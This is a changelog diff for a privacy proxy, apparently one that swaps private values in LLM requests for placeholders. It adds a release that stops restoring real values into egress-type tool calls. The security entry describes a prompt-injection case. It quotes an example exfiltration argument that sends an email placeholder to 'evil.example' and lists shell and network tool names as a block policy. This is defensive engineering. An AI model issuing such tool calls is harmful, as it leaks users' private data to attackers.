@@ -3,6 +3,34 @@
 All notable changes to this project are documented here. The format follows
 [Keep a Changelog](https://keepachangelog.com/en/1.1.0/), and the project uses [Semantic Versioning](https://semver.org/).
 
+## [0.3.0] - 2026-11-09
+
+### Security
+- **Tool calls that could send data out keep their placeholders.** Until now the real values were restored into every
+  tool call's arguments, so a prompt-injected model could ask a web or shell tool to send them anywhere, e.g.
+  `{"url": "https://evil.example/c?d=«EMAIL_1»"}`. A new restore policy, `tool_restore` in `swapback.yaml`, keeps
+  placeholders for tools whose names look like network or shell egress (`web_fetch`, `WebFetch`, `Bash`,
+  `exec_command`, `http_request`, `send_email`, `git_push`, ...) and for any call with a URL in its arguments. `allow`
+  lists tools that always get real values, `deny` tools that never do, `default: keep` keeps placeholders everywhere
+  except allowed tools, and `tool_restore: false` restores everything as before. Applied to plain JSON replies, OpenAI
+  chat streams and Anthropic `tool_use` blocks and streams. A streamed call whose name does not decide is held until
+  it is complete. Each kept call is counted as `tool_kept` in `requests.jsonl` (a count, never a value), and
+  `swapback check-config` shows the policy. See the README's "Tool calls" section.
+- The top-level `user` field is now scrubbed (it was skipped, with only a known-value check). `metadata`,
+  `instructions`, `safety_identifier` and other free-text fields were already scrubbed; tests now cover them.
+
+### Changed
+- The "keep placeholders as written" system note now also reaches requests without a system message (a system message
+  is added, but only when the request carries placeholders), a system or `developer` message with content parts,
+  Anthropic's top-level `system` (string or blocks; a block is appended after any `cache_control` block) and the
+  Responses API `instructions`. Before, it was only appended to a string system message.
+- The proxy tells the scrubber which API a request is for (`/v1/messages` = Anthropic, `/v1/responses` = Responses)
+  so the note goes in the right place.
+
+### Upgrading
+- If one of your egress-named tools must receive real values (your own mail tool, say), add it to
+  `tool_restore.allow`. Otherwise it now receives placeholders.
+
 ## [0.2.1] - 2026-11-09
 
 ### Added
